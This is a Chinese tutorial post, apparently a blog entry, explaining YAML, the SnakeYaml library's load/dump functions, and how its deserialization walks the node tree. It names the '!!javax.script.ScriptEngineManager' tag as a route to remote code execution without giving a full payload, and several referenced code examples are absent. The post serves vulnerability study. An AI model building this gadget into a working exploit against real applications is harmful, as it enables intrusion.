Yaml介绍

yaml全称YAML Ain’t Markup Language（一种“不是标记语言”的数据序列化格式），本质上是一种 通过缩进+符号表达层次、数组、键值对等数据结构的纯文本，扩展名为.yml 或 .yaml，常常用来写配置文件（如docker-compose.yml）或数据交换（与json类似）。例如：

SnakeYaml

简介

前面提到，yaml跟json一样也可以作为数据交换的载体，所以在java生态中，自然也有一种库来专门处理yaml数据流，那就是SnakeYaml。

与fastjson对比

不同于fastjson为json处理库，SnakeYaml为YAML 解析/生成库，SnakeYaml 目前只做两件事：
‑ 把 YAML 文本 → Java 对象（解析）
‑ 把 Java 对象 → YAML 文本（生成）
其他高级能力（日期格式、过滤、注解策略、性能优化）基本留给上层框架或用户自己做

而 FastJSON 除了“把 JSON 文本解析成对象 / 把对象序列化成 JSON”之外，还自带：

-日期格式化、字段过滤、循环引用检测、注解驱动的命名策略、ASM 字节码加速、Spring MVC 集成等。

如何转换

SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。

  • Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象；
  • Yaml.dump()：将一个对象转化为yaml文件形式；

通过yaml.load我们可以将这个yaml文件解析并反序列化为一个对象，返回的对象类型取决于 YAML 的内容：

  • 若 YAML 是一个普通的键值对，会返回一个 Map（通常是 LinkedHashMap）。
  • 若 YAML 是一个列表，会返回一个 List。
  • 若 YAML 是一个标量值（如字符串、数字），则返回对应的 Java 类型（如 String、Integer 等）。
  • 但如果 YAML 中包含了反序列化指令（如 !!javax.script.ScriptEngineManager [...]），SnakeYAML 会自动实例化指定的 Java 类，这可能导致远程代码执行（RCE）漏洞

如何将yaml文件反序列化为指定java类

如果我们想将yaml文件反序列化为一个指定的java类，这里有两种方法，先给出java类

第一种： 根类型构造器强制

在实例化yaml对象时把顶层类型写死在 Constructor 里 ，这种方法无论yaml中是否有tag，都会把文档当成指定java类来解析

第二种：YAML文件中指定全局tag

直接映射到类全限定名 ，构造器会默认注册指定类，符号用！！

第三种：显式注册tag

提前将类与tag的对应关系写入类，符号用！

ps：按理来说yaml反序列化指定的类需要符合javabean规范，如果person中的字段的修饰符为private，则反序列时会寻找该字段的setter，如果不存在setter，则会报错

反序列化原理

我们先从原理来看yaml反序列化是如何实现的，断点打在load处

跟进后会指向loadFromReader这个方法

这个方法很重要，我们一步步理解

  1. 首先，因为我们传入的是字符流StreamReader，因此需要ParserImpl这个类将字符流转为事件流。
  2. 然后Composer将组装转为节点树。
  3. 再将节点树传入构造器constructor。
  4. 最后再通过构造器调用getSingleData方法还原java对象。

我们跟进getSingleData，这里简要概况一下各条语句的作用

  1. Node node = this.composer.getSingleNode();获取文件的根节点，确保只有一个根节点
  2. if (node != null && !Tag.NULL.equals(node.getTag())) 只要节点存在且不是显式 null 就继续；否则走 else，直接返回 Java null
  3. if (Object.class != type)和else if (this.rootTag != null)判断是否要覆盖yaml文件中的tag，例如： 我们在实例化yaml对象时指定根类型构造器，那么type就会为根类型构造器指定的类，这个node里面的tag就会被覆盖掉
  4. return this.constructDocument(node);将处理后的节点解析为java对象

处理好node之后，将node解析会java对象，并清除缓存，这里constructObject这个方法比较关键，他会递归地遍历整个 Node 树，把每个节点转换成对应的 Java 对象，具体体现为寻找tag指定类的构造器循环如下堆栈查找字段并根据字段的修饰词采用不同的方式赋值

  • public 属性调用 FieldProperty#set(Object, Object) 反射
  • 非public 属性调用 MethodProperty#set(Object, Object) 通过 setter 方法赋值
